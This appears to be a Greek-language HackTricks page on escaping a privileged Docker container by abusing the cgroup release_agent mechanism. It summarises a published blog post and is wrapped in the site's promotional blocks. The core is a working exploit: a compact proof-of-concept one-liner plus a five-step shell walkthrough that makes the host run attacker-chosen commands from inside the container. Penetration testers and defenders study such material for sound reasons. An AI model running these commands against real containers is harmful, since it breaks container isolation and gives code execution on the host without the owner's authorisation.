# Διαφυγή από τα cgroups του Docker με το release_agent

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>


**Για περισσότερες λεπτομέρειες, ανατρέξτε στην [αρχική ανάρτηση στο blog](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** Αυτό είναι απλώς ένα σύνοψη:

Αρχικό PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Το αποδεικτικό προσχέδιο (PoC) δείχνει έναν τρόπο εκμετάλλευσης των cgroups δημιουργώντας ένα αρχείο `release_agent` και ενεργοποιώντας την κλήση του για να εκτελέσει αυθαίρετες εντολές στον κεντρικό υπολογιστή του container. Παρακάτω παρουσιάζονται οι βήματα που απαιτούνται:

1. **Προετοιμασία του Περιβάλλοντος:**
- Δημιουργείται ένας φάκελος `/tmp/cgrp` για να λειτουργήσει ως σημείο προσάρτησης για τα cgroups.
- Ο ελεγκτής cgroup RDMA προσαρτάται σε αυτόν τον φάκελο. Σε περίπτωση που λείπει ο ελεγκτής RDMA, προτείνεται να χρησιμοποιηθεί ο ελεγκτής cgroup `memory` ως εναλλακτική λύση.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Δημιουργία του Παιδικού Cgroup:**
- Δημιουργείται ένα παιδικό cgroup με το όνομα "x" εντός του καταλόγου του προσαρτημένου cgroup.
- Ενεργοποιούνται οι ειδοποιήσεις για το cgroup "x" γράφοντας τον αριθμό 1 στο αρχείο notify_on_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Διαμορφώστε τον Πράκτορα Απελευθέρωσης:**
- Η διαδρομή του container στον host ανακτάται από το αρχείο /etc/mtab.
- Στη συνέχεια, το αρχείο release_agent του cgroup διαμορφώνεται για να εκτελεί ένα σενάριο με το όνομα /cmd που βρίσκεται στην αποκτηθείσα διαδρομή του host.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Δημιουργία και Ρύθμιση του Σεναρίου /cmd:**
- Το σενάριο /cmd δημιουργείται μέσα στον εμπορευματοκιβώτιο και ρυθμίζεται να εκτελεί την εντολή ps aux, ανακατευθύνοντας την έξοδο σε ένα αρχείο με όνομα /output στον εμπορευματοκιβώτιο. Καθορίζεται ο πλήρης δρομολόγιος του /output στον κεντρικό υπολογιστή.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Εκτέλεση της Επίθεσης:**
- Ένας διεργασία ξεκινάει εντός του παιδικού cgroup "x" και αμέσως τερματίζεται.
- Αυτό ενεργοποιεί το `release_agent` (το /cmd script), το οποίο εκτελεί την εντολή ps aux στον κεντρικό υπολογιστή και γράφει την έξοδο στο /output μέσα στο container.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
